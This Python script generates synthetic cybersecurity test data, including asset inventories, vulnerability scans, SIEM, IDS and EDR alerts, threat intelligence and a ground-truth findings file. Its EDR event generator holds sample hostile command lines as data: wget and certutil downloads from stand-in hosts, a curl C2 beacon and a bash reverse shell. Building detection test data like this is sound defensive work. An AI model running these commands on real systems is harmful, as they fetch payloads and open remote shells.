#!/usr/bin/env python3
"""Generate synthetic cybersecurity data for all 6 use cases.

Produces realistic CSV/JSON files for vulnerability scans, asset inventories,
SIEM alerts, threat intel feeds, firewall logs, IDS alerts, EDR events,
incident playbooks, and network topology with deliberate anomalies injected.

Usage:
    python3 -m cybersecurity_pipeline.data_generator --output-dir experiments/cyber_run/data
"""

from __future__ import annotations

import argparse
import csv
import json
import random
import string
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

CVSS_SEVERITIES = ["Critical", "High", "Medium", "Low", "Informational"]
PATCH_STATUSES = ["Available", "Pending", "Not Available", "Applied"]
OS_LIST = ["Windows Server 2019", "Ubuntu 22.04", "RHEL 8", "CentOS 7", "Windows 10", "macOS 14"]
ASSET_TYPES = ["Server", "Workstation", "Network Device", "IoT", "Database", "Web Application"]
CRITICALITY = ["Critical", "High", "Medium", "Low"]
DEPARTMENTS = ["Engineering", "Finance", "HR", "Operations", "IT", "Executive", "Sales", "Legal"]

MITRE_TECHNIQUES = [
    ("T1566", "Phishing", "Initial Access"),
    ("T1059", "Command and Scripting Interpreter", "Execution"),
    ("T1053", "Scheduled Task/Job", "Persistence"),
    ("T1078", "Valid Accounts", "Privilege Escalation"),
    ("T1027", "Obfuscated Files or Information", "Defense Evasion"),
    ("T1003", "OS Credential Dumping", "Credential Access"),
    ("T1087", "Account Discovery", "Discovery"),
    ("T1021", "Remote Services", "Lateral Movement"),
    ("T1560", "Archive Collected Data", "Collection"),
    ("T1041", "Exfiltration Over C2 Channel", "Exfiltration"),
    ("T1486", "Data Encrypted for Impact", "Impact"),
    ("T1190", "Exploit Public-Facing Application", "Initial Access"),
    ("T1055", "Process Injection", "Defense Evasion"),
    ("T1071", "Application Layer Protocol", "Command and Control"),
    ("T1048", "Exfiltration Over Alternative Protocol", "Exfiltration"),
]

CVE_PREFIXES = ["CVE-2024-", "CVE-2023-", "CVE-2025-"]
ALERT_CATEGORIES = ["Malware", "Brute Force", "Data Exfiltration", "Lateral Movement",
                    "Privilege Escalation", "Policy Violation", "Reconnaissance", "C2 Communication"]
PROTOCOLS = ["TCP", "UDP", "ICMP", "HTTP", "HTTPS", "DNS", "SSH", "RDP", "SMB"]
FIREWALL_ACTIONS = ["ALLOW", "DENY", "DROP", "REJECT"]
COMPLIANCE_FRAMEWORKS = ["NIST CSF", "ISO 27001", "CIS Controls", "PCI DSS", "SOC 2"]

INCIDENT_TYPES = ["malware_infection", "phishing_compromise", "unauthorized_access",
                  "data_breach", "ddos_attack", "insider_threat"]

THREAT_ACTORS = ["APT28", "APT29", "Lazarus Group", "FIN7", "Carbanak",
                 "Unknown", "Script Kiddie", "Insider"]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _random_ip(internal: bool = True) -> str:
    if internal:
        prefix = random.choice(["10.0.", "172.16.", "192.168."])
        return f"{prefix}{random.randint(0,255)}.{random.randint(1,254)}"
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def _random_hostname() -> str:
    prefix = random.choice(["srv", "ws", "db", "web", "fw", "app", "mail", "vpn"])
    return f"{prefix}-{random.randint(100,999)}"


def _random_mac() -> str:
    return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))


def _random_hash(length: int = 64) -> str:
    return "".join(random.choices(string.hexdigits[:16], k=length))


def _random_domain() -> str:
    words = ["shadow", "dark", "storm", "cyber", "net", "cloud", "data", "tech", "sys", "core"]
    tlds = [".com", ".net", ".org", ".io", ".xyz", ".ru", ".cn"]
    return random.choice(words) + random.choice(words) + random.choice(tlds)


def _random_ts(base: datetime, spread_hours: int = 720) -> str:
    delta = timedelta(hours=random.randint(0, spread_hours), minutes=random.randint(0, 59),
                      seconds=random.randint(0, 59))
    return (base - delta).strftime("%Y-%m-%dT%H:%M:%SZ")


# ---------------------------------------------------------------------------
# Generators
# ---------------------------------------------------------------------------

def generate_asset_inventory(count: int) -> list[dict]:
    assets = []
    for i in range(count):
        assets.append({
            "asset_id": f"ASSET-{i+1:04d}",
            "hostname": _random_hostname(),
            "ip_address": _random_ip(),
            "mac_address": _random_mac(),
            "os": random.choice(OS_LIST),
            "asset_type": random.choice(ASSET_TYPES),
            "criticality": random.choice(CRITICALITY),
            "department": random.choice(DEPARTMENTS),
            "owner": f"user{random.randint(100,999)}@corp.local",
            "last_seen": _random_ts(datetime(2025, 1, 15), 48),
            "status": random.choice(["Active"] * 9 + ["Decommissioned"]),
        })
    return assets


def generate_vulnerability_scan(assets: list[dict], vuln_count: int) -> list[dict]:
    vulns = []
    for i in range(vuln_count):
        asset = random.choice(assets)
        cvss = round(random.uniform(0, 10), 1)
        if cvss >= 9.0: sev = "Critical"
        elif cvss >= 7.0: sev = "High"
        elif cvss >= 4.0: sev = "Medium"
        elif cvss >= 0.1: sev = "Low"
        else: sev = "Informational"
        vulns.append({
            "vuln_id": f"VULN-{i+1:05d}",
            "cve_id": random.choice(CVE_PREFIXES) + str(random.randint(10000, 99999)),
            "asset_id": asset["asset_id"],
            "hostname": asset["hostname"],
            "ip_address": asset["ip_address"],
            "cvss_score": cvss,
            "severity": sev,
            "description": f"Vulnerability in {random.choice(['OpenSSL','Apache','nginx','kernel','SMB','RDP','SSH'])} service",
            "patch_status": random.choice(PATCH_STATUSES),
            "first_detected": _random_ts(datetime(2025, 1, 10), 720),
            "last_detected": _random_ts(datetime(2025, 1, 15), 48),
            "exploitable": random.choice(["Yes", "No", "Unknown"]),
        })
    return vulns


def generate_patch_catalog(vulns: list[dict]) -> list[dict]:
    cves_seen: set[str] = set()
    patches = []
    for v in vulns:
        cve = v["cve_id"]
        if cve in cves_seen:
            continue
        cves_seen.add(cve)
        patches.append({
            "cve_id": cve,
            "patch_id": f"PATCH-{len(patches)+1:04d}",
            "vendor": random.choice(["Microsoft", "Canonical", "RedHat", "Apache", "OpenSSL"]),
            "release_date": _random_ts(datetime(2025, 1, 12), 360),
            "severity": v["severity"],
            "status": random.choice(["Released", "Pending", "Not Available"]),
        })
    return patches


def generate_internal_alerts(assets: list[dict], count: int) -> list[dict]:
    base = datetime(2025, 1, 15)
    alerts = []
    for i in range(count):
        asset = random.choice(assets)
        is_fp = random.random() < 0.3  # 30% false positive rate
        alerts.append({
            "alert_id": f"ALERT-{i+1:06d}",
            "timestamp": _random_ts(base, 168),
            "source_ip": _random_ip() if random.random() > 0.5 else _random_ip(False),
            "destination_ip": asset["ip_address"],
            "destination_host": asset["hostname"],
            "category": random.choice(ALERT_CATEGORIES),
            "severity": random.choice(["Critical", "High", "Medium", "Low"]),
            "mitre_technique": random.choice(MITRE_TECHNIQUES)[0],
            "description": f"Suspicious activity detected on {asset['hostname']}",
            "false_positive": is_fp,
            "disposition": "False Positive" if is_fp else random.choice(["True Positive", "Under Review"]),
        })
    return alerts


def generate_threat_intel_feed(count: int) -> list[dict]:
    iocs = []
    for i in range(count):
        ioc_type = random.choice(["ip", "domain", "hash", "url"])
        if ioc_type == "ip": value = _random_ip(False)
        elif ioc_type == "domain": value = _random_domain()
        elif ioc_type == "hash": value = _random_hash(64)
        else: value = f"http://{_random_domain()}/{_random_hash(8)}"

        tech = random.choice(MITRE_TECHNIQUES)
        iocs.append({
            "ioc_id": f"IOC-{i+1:05d}",
            "ioc_type": ioc_type,
            "ioc_value": value,
            "confidence": random.choice(["high", "medium", "low"]),
            "threat_actor": random.choice(THREAT_ACTORS),
            "mitre_technique_id": tech[0],
            "mitre_technique_name": tech[1],
            "mitre_tactic": tech[2],
            "first_seen": _random_ts(datetime(2025, 1, 10), 360),
            "last_seen": _random_ts(datetime(2025, 1, 15), 48),
            "source": random.choice(["Internal", "OSINT", "Commercial Feed", "ISAC"]),
        })
    return iocs


def generate_firewall_log(count: int) -> list[str]:
    base = datetime(2025, 1, 15)
    lines = []
    for _ in range(count):
        ts = (base - timedelta(hours=random.randint(0, 168), minutes=random.randint(0, 59))).strftime(
            "%b %d %H:%M:%S")
        src = _random_ip(random.random() > 0.4)
        dst = _random_ip(True)
        proto = random.choice(PROTOCOLS)
        action = random.choice(FIREWALL_ACTIONS)
        sport = random.randint(1024, 65535)
        dport = random.choice([22, 80, 443, 3389, 445, 53, 8080, 8443, random.randint(1, 65535)])
        lines.append(
            f"{ts} fw-core-01 {action} {proto} src={src} dst={dst} sport={sport} dport={dport} "
            f"bytes={random.randint(40,65000)} rule=rule-{random.randint(1,200)}"
        )
    return lines


def generate_ids_alerts(count: int) -> list[dict]:
    base = datetime(2025, 1, 15)
    alerts = []
    for i in range(count):
        alerts.append({
            "alert_id": f"IDS-{i+1:06d}",
            "timestamp": _random_ts(base, 168),
            "signature_id": f"SID-{random.randint(1000000,9999999)}",
            "signature_name": random.choice([
                "ET MALWARE CnC Beacon", "GPL ATTACK SQL Injection",
                "ET SCAN Nmap Scripting Engine", "ET POLICY DNS Query to .ru TLD",
                "ET TROJAN Known RAT CnC", "ET EXPLOIT Apache Struts RCE",
                "GPL SHELLCODE x86 NOOP", "ET WEB_SERVER PHP Remote File Inclusion",
            ]),
            "source_ip": _random_ip(random.random() > 0.5),
            "destination_ip": _random_ip(True),
            "protocol": random.choice(PROTOCOLS[:5]),
            "severity": random.randint(1, 4),
            "category": random.choice(ALERT_CATEGORIES[:5]),
        })
    return alerts


def generate_edr_events(assets: list[dict], count: int) -> list[dict]:
    base = datetime(2025, 1, 15)
    events = []
    for i in range(count):
        asset = random.choice(assets)
        events.append({
            "event_id": f"EDR-{i+1:06d}",
            "timestamp": _random_ts(base, 168),
            "hostname": asset["hostname"],
            "asset_id": asset["asset_id"],
            "event_type": random.choice(["ProcessCreate", "FileWrite", "NetworkConnect",
                                         "RegistryModify", "DLLLoad", "ScriptExecution"]),
            "process_name": random.choice(["powershell.exe", "cmd.exe", "python3", "svchost.exe",
                                           "explorer.exe", "chrome.exe", "wget", "curl", "bash"]),
            "command_line": random.choice([
                "powershell -enc <base64>", "cmd /c whoami", "python3 -c 'import socket'",
                "wget http://evil.com/payload", "curl -s http://c2.xyz/beacon",
                "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "certutil -urlcache -f http://bad.com/a.exe",
            ]),
            "severity": random.choice(["Critical", "High", "Medium", "Low"]),
            "user": f"user{random.randint(100,999)}",
        })
    return events


def generate_network_topology(assets: list[dict]) -> dict:
    nodes = []
    for a in assets[:30]:
        nodes.append({"id": a["asset_id"], "label": a["hostname"], "type": a["asset_type"],
                       "ip": a["ip_address"], "zone": random.choice(["DMZ", "Internal", "Management", "Guest"])})
    edges = []
    for i in range(len(nodes)):
        targets = random.sample(range(len(nodes)), min(random.randint(1, 3), len(nodes)))
        for t in targets:
            if t != i:
                edges.append({"source": nodes[i]["id"], "target": nodes[t]["id"],
                              "protocol": random.choice(PROTOCOLS[:5]),
                              "port": random.choice([22, 80, 443, 3389, 445])})
    return {"nodes": nodes, "edges": edges}


def generate_playbook_templates() -> list[dict]:
    playbooks = []
    for inc_type in INCIDENT_TYPES:
        playbooks.append({
            "playbook_id": f"PB-{inc_type.upper().replace('_','-')}",
            "incident_type": inc_type,
            "severity_threshold": random.choice(["Critical", "High"]),
            "steps": [
                {"step": 1, "action": "Validate alert and classify severity", "automated": True},
                {"step": 2, "action": "Identify affected assets from inventory", "automated": True},
                {"step": 3, "action": "Execute short-term containment", "automated": False},
                {"step": 4, "action": "Collect forensic evidence", "automated": False},
                {"step": 5, "action": "Eradicate root cause", "automated": False},
                {"step": 6, "action": "Restore and validate normal operations", "automated": False},
            ],
            "escalation_contacts": [f"soc-lead@corp.local", f"ciso@corp.local"],
            "sla_hours": random.choice([1, 2, 4, 8]),
        })
    return playbooks


def generate_mitre_mapping() -> dict:
    mapping = {}
    for tid, tname, tactic in MITRE_TECHNIQUES:
        mapping[tid] = {"name": tname, "tactic": tactic,
                        "platforms": random.sample(["Windows", "Linux", "macOS", "Network"], random.randint(1, 3)),
                        "detection_coverage": random.choice(["High", "Medium", "Low", "None"])}
    return mapping


def generate_ground_truth(vulns: list[dict], alerts: list[dict]) -> list[dict]:
    findings = []
    # Critical unpatched vulns
    for v in vulns:
        if v["severity"] == "Critical" and v["patch_status"] != "Applied":
            findings.append({"finding_id": f"GT-{len(findings)+1:04d}", "type": "unpatched_critical",
                             "reference_id": v["vuln_id"], "expected_action": "patch_immediately"})
    # True positive alerts
    for a in alerts:
        if not a.get("false_positive", False) and a["severity"] in ("Critical", "High"):
            findings.append({"finding_id": f"GT-{len(findings)+1:04d}", "type": "true_positive_alert",
                             "reference_id": a["alert_id"], "expected_action": "investigate"})
            if len(findings) > 60:
                break
    return findings[:80]


# ---------------------------------------------------------------------------
# CSV/JSON Writers
# ---------------------------------------------------------------------------

def _write_csv(path: Path, columns: list[str], rows: list[dict]) -> int:
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=columns, extrasaction="ignore")
        writer.writeheader()
        writer.writerows(rows)
    return len(rows)


def _write_json(path: Path, data: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data, indent=2, default=str), encoding="utf-8")


def _write_lines(path: Path, lines: list[str]) -> int:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return len(lines)


# ---------------------------------------------------------------------------
# Main orchestrator
# ---------------------------------------------------------------------------

@dataclass
class GenerationResult:
    output_dir: Path
    asset_count: int
    vuln_count: int
    alert_count: int
    ioc_count: int
    firewall_log_count: int
    ids_alert_count: int
    edr_event_count: int
    ground_truth_count: int
    files: list[str] = field(default_factory=list)


def generate_all(
    output_dir: Path,
    *,
    asset_count: int = 50,
    vuln_count: int = 200,
    alert_count: int = 150,
    ioc_count: int = 100,
    firewall_log_count: int = 500,
    ids_alert_count: int = 100,
    edr_event_count: int = 120,
    seed: int | None = None,
) -> GenerationResult:
    """Generate all cybersecurity synthetic data files under output_dir."""
    if seed is not None:
        random.seed(seed)

    output_dir.mkdir(parents=True, exist_ok=True)

    # 1. Asset inventory
    assets = generate_asset_inventory(asset_count)
    _write_csv(output_dir / "asset_inventory.csv",
               ["asset_id", "hostname", "ip_address", "mac_address", "os", "asset_type",
                "criticality", "department", "owner", "last_seen", "status"], assets)

    # 2. Vulnerability scan
    vulns = generate_vulnerability_scan(assets, vuln_count)
    _write_csv(output_dir / "vulnerability_scan.csv",
               ["vuln_id", "cve_id", "asset_id", "hostname", "ip_address", "cvss_score",
                "severity", "description", "patch_status", "first_detected", "last_detected",
                "exploitable"], vulns)

    # 3. Patch catalog
    patches = generate_patch_catalog(vulns)
    _write_json(output_dir / "patch_catalog.json", patches)

    # 4. Internal SIEM alerts
    alerts = generate_internal_alerts(assets, alert_count)
    _write_csv(output_dir / "internal_alerts.csv",
               ["alert_id", "timestamp", "source_ip", "destination_ip", "destination_host",
                "category", "severity", "mitre_technique", "description", "false_positive",
                "disposition"], alerts)

    # 5. Threat intel feed
    iocs = generate_threat_intel_feed(ioc_count)
    _write_json(output_dir / "threat_intel_feed.json", iocs)

    # 6. IOC database (CSV version)
    _write_csv(output_dir / "ioc_database.csv",
               ["ioc_id", "ioc_type", "ioc_value", "confidence", "threat_actor",
                "mitre_technique_id", "first_seen", "last_seen", "source"], iocs)

    # 7. Firewall logs
    fw_lines = generate_firewall_log(firewall_log_count)
    _write_lines(output_dir / "firewall_log.log", fw_lines)

    # 8. IDS alerts
    ids = generate_ids_alerts(ids_alert_count)
    _write_json(output_dir / "ids_alerts.json", ids)

    # 9. EDR events
    edr = generate_edr_events(assets, edr_event_count)
    _write_csv(output_dir / "edr_events.csv",
               ["event_id", "timestamp", "hostname", "asset_id", "event_type", "process_name",
                "command_line", "severity", "user"], edr)

    # 10. Baseline traffic profile
    _write_json(output_dir / "baseline_traffic_profile.json", {
        "avg_connections_per_hour": random.randint(5000, 20000),
        "peak_hour": random.randint(9, 17),
        "common_ports": [80, 443, 22, 53, 8080],
        "avg_bytes_per_session": random.randint(1000, 50000),
        "baseline_period": "2024-12-01 to 2024-12-31",
    })

    # 11. Network topology
    topo = generate_network_topology(assets)
    _write_json(output_dir / "network_topology.json", topo)

    # 12. Playbook templates
    playbooks = generate_playbook_templates()
    _write_json(output_dir / "playbook_templates.json", playbooks)

    # 13. MITRE mapping
    mitre = generate_mitre_mapping()
    _write_json(output_dir / "mitre_attack_mapping.json", mitre)

    # 14. Risk score config
    _write_json(output_dir / "risk_score_config.json", {
        "cvss_weight": 0.4, "exploitability_weight": 0.3,
        "asset_criticality_weight": 0.2, "exposure_weight": 0.1,
        "severity_thresholds": {"critical": 9.0, "high": 7.0, "medium": 4.0, "low": 0.1},
    })

    # 15. Ground truth
    gt = generate_ground_truth(vulns, alerts)
    _write_csv(output_dir / "ground_truth_findings.csv",
               ["finding_id", "type", "reference_id", "expected_action"], gt)

    # 16. Manifest
    files = [
        "asset_inventory.csv", "vulnerability_scan.csv", "patch_catalog.json",
        "internal_alerts.csv", "threat_intel_feed.json", "ioc_database.csv",
        "firewall_log.log", "ids_alerts.json", "edr_events.csv",
        "baseline_traffic_profile.json", "network_topology.json",
        "playbook_templates.json", "mitre_attack_mapping.json",
        "risk_score_config.json", "ground_truth_findings.csv", "data_manifest.json",
    ]
    meta = {
        "domain": "cybersecurity",
        "asset_count": asset_count, "vuln_count": vuln_count,
        "alert_count": alert_count, "ioc_count": ioc_count,
        "firewall_log_count": firewall_log_count, "ids_alert_count": ids_alert_count,
        "edr_event_count": edr_event_count, "ground_truth_count": len(gt),
        "files": files,
    }
    _write_json(output_dir / "data_manifest.json", meta)

    return GenerationResult(
        output_dir=output_dir, asset_count=asset_count, vuln_count=vuln_count,
        alert_count=alert_count, ioc_count=ioc_count,
        firewall_log_count=firewall_log_count, ids_alert_count=ids_alert_count,
        edr_event_count=edr_event_count, ground_truth_count=len(gt), files=files,
    )


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(description="Generate synthetic cybersecurity data")
    parser.add_argument("--output-dir", default="experiments/cyber_run/data")
    parser.add_argument("--assets", type=int, default=50)
    parser.add_argument("--vulns", type=int, default=200)
    parser.add_argument("--alerts", type=int, default=150)
    parser.add_argument("--iocs", type=int, default=100)
    parser.add_argument("--seed", type=int, default=None)
    args = parser.parse_args()

    result = generate_all(
        Path(args.output_dir), asset_count=args.assets, vuln_count=args.vulns,
        alert_count=args.alerts, ioc_count=args.iocs, seed=args.seed,
    )
    print(f"Generated cybersecurity data in {result.output_dir}/")
    print(f"  Assets: {result.asset_count}  Vulns: {result.vuln_count}")
    print(f"  Alerts: {result.alert_count}  IOCs: {result.ioc_count}")
    print(f"  Ground truth findings: {result.ground_truth_count}")
    print(f"  Files: {', '.join(result.files)}")


if __name__ == "__main__":
    main()
